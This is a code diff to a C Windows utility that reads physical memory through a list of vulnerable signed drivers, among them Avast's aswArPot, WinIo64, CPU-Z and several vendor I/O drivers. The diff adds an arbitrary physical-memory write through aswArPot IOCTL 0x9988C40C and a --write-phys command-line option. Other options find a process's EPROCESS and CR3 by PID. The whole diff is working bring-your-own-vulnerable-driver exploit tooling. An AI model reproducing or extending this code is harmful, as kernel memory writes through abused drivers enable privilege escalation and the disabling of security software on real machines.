@@ -38,6 +38,7 @@ struct mb_phys_reader {
     uint64_t mock_size;
     uint32_t aux;             // provider-specific: e.g. CPU-Z expected page-first dword
     int (*read)(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size);
+    int (*write)(mb_phys_reader *r, uint64_t pa, const void *buf, uint32_t size);
 };
 
 static int read_cchwapi(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
@@ -343,6 +344,25 @@ static int read_aswarpot(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t siz
     return 1;
 }
 
+// aswArPot write IOCTL 0x9988C40C: input 12 bytes {u32 phys; u8 data[4]; u32 size(1..4)}.
+static int aswarpot_build_write_request(uint32_t pa, const uint8_t *data, uint32_t size, uint8_t out[12]) {
+    if (!out || !data || size < 1 || size > 4) return 0;
+    memset(out, 0, 12);
+    *(uint32_t *)(out + 0) = pa;
+    memcpy(out + 4, data, size);
+    *(uint32_t *)(out + 8) = size;
+    return 1;
+}
+
+static int aswarpot_write(mb_phys_reader *r, uint64_t pa, const void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || size < 1 || size > 4) return 0;
+    if (pa > 0xFFFFFFFFull) return 0;
+    uint8_t in[12];
+    DWORD ret = 0;
+    if (!aswarpot_build_write_request((uint32_t)pa, (const uint8_t *)buf, size, in)) return 0;
+    return DeviceIoControl(r->dev, 0x9988C40Cu, in, sizeof(in), NULL, 0, &ret, NULL) ? 1 : 0;
+}
+
 // ---- 取数层 provider: WinIo64 (classic physical map driver) ----
 // Device \\.\WinIo. IOCTL_WINIO_MAPPHYSTOLIN (0x80102040):
 //   input/output 0x28: {u64 size; u64 phys_start; HANDLE section_handle;
@@ -474,6 +494,7 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
         r->name = "aswarpot";
         r->mode = 9;
         r->read = read_aswarpot;
+        r->write = aswarpot_write;
         const char *candidates[] = { "\\\\.\\aswSP_ArPot2", "\\\\.\\avastSP_ArPot2", "\\\\.\\aswSP_ArPot" };
         if (device) {
             r->dev = CreateFileA(device, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -983,6 +1004,22 @@ static int mb_layer_read_va(mb_phys_reader *r, uint64_t cr3, uint64_t va,
     return 1;
 }
 
+static int hex_decode(const char *s, uint8_t *out, int max) {
+    int n = 0;
+    while (s && *s && n < max) {
+        while (*s == ' ' || *s == '\t' || *s == '-' || *s == ':') s++;
+        if (!*s) break;
+        char hi = *s++;
+        if (!*s) return -1;
+        char lo = *s++;
+        int vh = (hi >= '0' && hi <= '9') ? hi - '0' : (hi >= 'a' && hi <= 'f') ? hi - 'a' + 10 : (hi >= 'A' && hi <= 'F') ? hi - 'A' + 10 : -1;
+        int vl = (lo >= '0' && lo <= '9') ? lo - '0' : (lo >= 'a' && lo <= 'f') ? lo - 'a' + 10 : (lo >= 'A' && lo <= 'F') ? lo - 'A' + 10 : -1;
+        if (vh < 0 || vl < 0) return -1;
+        out[n++] = (uint8_t)((vh << 4) | vl);
+    }
+    return n;
+}
+
 // Diagnostic: probe which real provider devices are currently present.
 static int probe_readers(void) {
     const char *kinds[] = { "cchwapi", "rtkio", "eneio64", "asrdrv", "mrt", "cpuz",
@@ -1171,6 +1208,15 @@ static int selftest_mock(void) {
                   *(uint32_t *)(aswrq + 8) == 0x1000;
     check("取数层(fetcher)", "aswArPot physical read request layout", ok_aswr);
 
+    // aswArPot physical write request layout (offline, no driver)
+    uint8_t awdata[4] = { 0xAA, 0xBB, 0xCC, 0xDD };
+    uint8_t awwreq[12];
+    int ok_asww = aswarpot_build_write_request(0x12345678, awdata, 4, awwreq) &&
+                  *(uint32_t *)(awwreq + 0) == 0x12345678 &&
+                  awwreq[4] == 0xAA && awwreq[5] == 0xBB &&
+                  *(uint32_t *)(awwreq + 8) == 4;
+    check("取数层(fetcher)", "aswArPot physical write request layout", ok_asww);
+
     // WinIo64 MAPPHYSTOLIN request layout (offline, no driver)
     uint8_t wioreq[0x28];
     int ok_wio = winio64_build_map_request(0x12345678, 0x100, wioreq) &&
@@ -1300,6 +1346,8 @@ static void usage(void) {
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader ... --write-phys --pa <hex> --data <hex bytes>  (providers with write)\n");
+    printf("  layers --reader <mock> --cr3 <hex> --va <hex> --size <n>\n");
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
@@ -1318,7 +1366,8 @@ int main(int argc, char **argv) {
     const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL, *kprl_device = NULL, *invary_device = NULL;
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0, expect_first = 0;
-    int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
+    int do_selftest = 0, do_read_phys = 0, do_write_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
+    const char *data_hex = NULL;
     int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, do_invary_read = 0, do_probe = 0, do_probe_loc = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
@@ -1339,6 +1388,8 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--scan-start") == 0 && i + 1 < argc) scan_start = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--scan-size") == 0 && i + 1 < argc) scan_size = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
+        else if (strcmp(argv[i], "--write-phys") == 0) do_write_phys = 1;
+        else if (strcmp(argv[i], "--data") == 0 && i + 1 < argc) data_hex = argv[++i];
         else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
         else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
         else if (strcmp(argv[i], "--kprl") == 0) use_kprl = 1;
@@ -1410,6 +1461,22 @@ int main(int argc, char **argv) {
             printf("\nVERDICT=PASS\n");
         }
         free(b);
+    } else if (do_write_phys) {
+        uint8_t wd[8];
+        int wl = hex_decode(data_hex, wd, (int)sizeof(wd));
+        if (!r.write) {
+            printf("[ERR] provider '%s' has no physical write support\n", r.name ? r.name : "?");
+            rc = 6;
+        } else if (wl < 1 || wl > 4) {
+            printf("[ERR] --write-phys needs --data with 1-4 bytes (got %d)\n", wl);
+            rc = 6;
+        } else if (!r.write(&r, pa, wd, (uint32_t)wl)) {
+            printf("[ERR] write %d bytes at PA=0x%llX failed\n", wl, (unsigned long long)pa);
+            rc = 5;
+        } else {
+            printf("[OK] wrote %d bytes at PA=0x%llX\n", wl, (unsigned long long)pa);
+            printf("VERDICT=PASS\n");
+        }
     } else if (do_locate) {
         uint64_t got_cr3 = 0, eproc = 0;
         if (use_auto && pid) {
